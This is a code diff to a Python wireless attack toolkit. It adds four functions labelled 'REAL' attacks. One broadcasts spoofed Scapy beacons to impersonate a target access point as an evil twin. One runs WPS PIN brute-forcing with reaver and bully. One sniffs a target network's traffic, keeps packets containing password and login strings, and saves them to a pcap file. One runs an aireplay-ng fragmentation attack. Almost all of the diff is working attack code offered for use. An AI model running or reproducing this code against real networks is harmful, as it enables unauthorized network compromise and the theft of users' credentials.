@@ -109,6 +109,300 @@ class AttackManager:
 # Global attack manager instance
 attack_manager = AttackManager()
 
+def evil_twin_attack(interface, target_bssid, target_ssid, channel=6, logger=None):
+    """
+    REAL Evil Twin attack using Scapy to create fake access point
+    
+    Args:
+        interface: Network interface in monitor mode
+        target_bssid: BSSID of target AP to spoof
+        target_ssid: SSID of target AP to spoof
+        channel: WiFi channel to use
+        logger: Logger instance
+    """
+    if logger is None:
+        logger = logging.getLogger("attacks")
+    
+    try:
+        # Validate inputs
+        attack_manager._validate_interface(interface)
+        attack_manager._validate_mac_address(target_bssid)
+        
+        logger.info(f"Starting REAL evil twin attack: {target_ssid} ({target_bssid}) on channel {channel}")
+        attack_manager._log_attack_event("evil_twin_start", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid, 
+                                       target_ssid=target_ssid,
+                                       channel=channel)
+        
+        # Create beacon frames for evil twin
+        radiotap = RadioTap()
+        
+        # Use target BSSID for spoofing
+        dot11 = Dot11(
+            type=0,  # Management frame
+            subtype=8,  # Beacon
+            addr1="ff:ff:ff:ff:ff:ff",  # Destination (broadcast)
+            addr2=target_bssid,  # Source (spoofed AP)
+            addr3=target_bssid   # BSSID (spoofed)
+        )
+        
+        beacon = Dot11Beacon(
+            cap=0x1104,  # ESS, privacy
+            timestamp=int(time.time() * 1000000) % (2**64)
+        )
+        
+        # SSID element
+        ssid_elt = Dot11Elt(ID=0, info=target_ssid.encode())
+        
+        # Supported rates element
+        rates_elt = Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
+        
+        # DS Parameter Set (channel)
+        ds_elt = Dot11Elt(ID=3, info=bytes([channel]))
+        
+        # Assemble packet
+        packet = radiotap / dot11 / beacon / ssid_elt / rates_elt / ds_elt
+        
+        # Send beacon frames continuously
+        start_time = time.time()
+        sent_count = 0
+        
+        logger.info(f"Broadcasting evil twin beacons for {target_ssid}...")
+        
+        while True:  # Run until stopped
+            try:
+                sendp(packet, iface=interface, verbose=False)
+                sent_count += 1
+                
+                if sent_count % 100 == 0:
+                    logger.info(f"Sent {sent_count} evil twin beacons")
+                
+                time.sleep(0.1)  # 10 beacons per second
+                
+            except KeyboardInterrupt:
+                break
+            except Exception as e:
+                logger.warning(f"Failed to send beacon: {e}")
+                continue
+        
+        duration = time.time() - start_time
+        logger.info(f"Evil twin attack completed: {sent_count} beacons sent in {duration:.2f}s")
+        attack_manager._log_attack_event("evil_twin_complete", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid,
+                                       sent_count=sent_count,
+                                       duration=duration)
+        return True
+        
+    except Exception as e:
+        logger.error(f"Evil twin attack failed: {e}")
+        attack_manager._log_attack_event("evil_twin_error", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid, 
+                                       error=str(e))
+        return False
+
+def wps_attack(interface, target_bssid, timeout=300, logger=None):
+    """
+    REAL WPS PIN attack using external tools
+    
+    Args:
+        interface: Network interface in monitor mode
+        target_bssid: BSSID of target AP
+        timeout: Attack timeout in seconds
+        logger: Logger instance
+    """
+    if logger is None:
+        logger = logging.getLogger("attacks")
+    
+    try:
+        # Validate inputs
+        attack_manager._validate_interface(interface)
+        attack_manager._validate_mac_address(target_bssid)
+        
+        logger.info(f"Starting REAL WPS attack on {target_bssid}")
+        attack_manager._log_attack_event("wps_attack_start", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid)
+        
+        # Try reaver first, then bully
+        tools = ['reaver', 'bully']
+        success = False
+        
+        for tool in tools:
+            try:
+                if tool == 'reaver':
+                    cmd = ['reaver', '-i', interface, '-b', target_bssid, '-vv', '-L', '-N', '-d', '15', '-T', '0.5', '-r', '3:15']
+                else:  # bully
+                    cmd = ['bully', interface, '-b', target_bssid, '-v', '3', '-S', '-F', '-B']
+                
+                logger.info(f"Running {tool} WPS attack...")
+                result = run_external_tool(cmd, dry_run=False, logger=logger, timeout=timeout)
+                
+                if result:
+                    success = True
+                    break
+                    
+            except Exception as e:
+                logger.warning(f"{tool} WPS attack failed: {e}")
+                continue
+        
+        if success:
+            logger.info(f"WPS attack completed successfully on {target_bssid}")
+            attack_manager._log_attack_event("wps_attack_complete", 
+                                           interface=interface, 
+                                           target_bssid=target_bssid)
+        else:
+            logger.warning(f"WPS attack failed on {target_bssid}")
+            attack_manager._log_attack_event("wps_attack_failed", 
+                                           interface=interface, 
+                                           target_bssid=target_bssid)
+        
+        return success
+        
+    except Exception as e:
+        logger.error(f"WPS attack failed: {e}")
+        attack_manager._log_attack_event("wps_attack_error", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid,
+                                       error=str(e))
+        return False
+
+def credential_capture(interface, target_bssid, duration=300, logger=None):
+    """
+    REAL credential capture using packet sniffing
+    
+    Args:
+        interface: Network interface in monitor mode
+        target_bssid: BSSID of target AP
+        duration: Capture duration in seconds
+        logger: Logger instance
+    """
+    if logger is None:
+        logger = logging.getLogger("attacks")
+    
+    try:
+        # Validate inputs
+        attack_manager._validate_interface(interface)
+        attack_manager._validate_mac_address(target_bssid)
+        
+        logger.info(f"Starting REAL credential capture on {target_bssid}")
+        attack_manager._log_attack_event("credential_capture_start", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid)
+        
+        # Set up packet filter for HTTP/HTTPS traffic
+        def credential_filter(packet):
+            if packet.haslayer(Dot11):
+                # Look for data frames to/from target
+                if (packet[Dot11].addr1 == target_bssid or 
+                    packet[Dot11].addr2 == target_bssid):
+                    return True
+            return False
+        
+        # Capture packets
+        start_time = time.time()
+        captured_packets = []
+        credentials_found = []
+        
+        def packet_handler(packet):
+            if credential_filter(packet):
+                captured_packets.append(packet)
+                
+                # Look for HTTP data
+                if packet.haslayer('Raw'):
+                    try:
+                        data = packet['Raw'].load.decode('utf-8', errors='ignore')
+                        
+                        # Look for common credential patterns
+                        if any(keyword in data.lower() for keyword in ['password', 'username', 'login', 'auth', 'credential']):
+                            credentials_found.append({
+                                'timestamp': time.time(),
+                                'data': data[:200],  # First 200 chars
+                                'source': packet[Dot11].addr2 if packet[Dot11].addr2 != target_bssid else packet[Dot11].addr1
+                            })
+                            logger.info(f"Potential credentials found from {credentials_found[-1]['source']}")
+                    except:
+                        pass
+        
+        # Start sniffing
+        sniff(iface=interface, prn=packet_handler, timeout=duration, store=0)
+        
+        # Save captured data
+        if captured_packets:
+            from scapy.utils import wrpcap
+            output_file = f"/tmp/credentials_{target_bssid.replace(':', '')}.pcap"
+            wrpcap(output_file, captured_packets)
+            logger.info(f"Credential capture completed: {len(captured_packets)} packets, {len(credentials_found)} potential credentials saved to {output_file}")
+        else:
+            logger.warning("No packets captured")
+        
+        attack_manager._log_attack_event("credential_capture_complete", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid,
+                                       packet_count=len(captured_packets),
+                                       credential_count=len(credentials_found))
+        
+        return len(credentials_found) > 0
+        
+    except Exception as e:
+        logger.error(f"Credential capture failed: {e}")
+        attack_manager._log_attack_event("credential_capture_error", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid,
+                                       error=str(e))
+        return False
+
+def fragmentation_attack(interface, target_bssid, timeout=300, logger=None):
+    """
+    REAL fragmentation attack using aireplay-ng
+    
+    Args:
+        interface: Network interface in monitor mode
+        target_bssid: BSSID of target AP
+        timeout: Attack timeout in seconds
+        logger: Logger instance
+    """
+    if logger is None:
+        logger = logging.getLogger("attacks")
+    
+    try:
+        # Validate inputs
+        attack_manager._validate_interface(interface)
+        attack_manager._validate_mac_address(target_bssid)
+        
+        logger.info(f"Starting REAL fragmentation attack on {target_bssid}")
+        attack_manager._log_attack_event("fragmentation_attack_start", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid)
+        
+        # Use aireplay-ng for fragmentation attack
+        cmd = ['aireplay-ng', '-5', '-b', target_bssid, interface]
+        
+        result = run_external_tool(cmd, dry_run=False, logger=logger, timeout=timeout)
+        
+        if result:
+            logger.info(f"Fragmentation attack completed successfully on {target_bssid}")
+            attack_manager._log_attack_event("fragmentation_attack_complete", 
+                                           interface=interface, 
+                                           target_bssid=target_bssid)
+        else:
+            logger.warning(f"Fragmentation attack failed on {target_bssid}")
+            attack_manager._log_attack_event("fragmentation_attack_failed", 
+                                           interface=interface, 
+                                           target_bssid=target_bssid)
+        
+        return result
+        
+    except Exception as e:
+        logger.error(f"Fragmentation attack failed: {e}")
+        attack_manager._log_attack_event("fragmentation_attack_error", 
+                                       interface=interface, 
+                                       target_bssid=target_bssid,
+                                       error=str(e))
+        return False
+
 def deauth_attack(interface, target_bssid, packet_count=10, dry_run=False, logger=None, 
                  target_client='ff:ff:ff:ff:ff:ff', interval=0.1):
     """
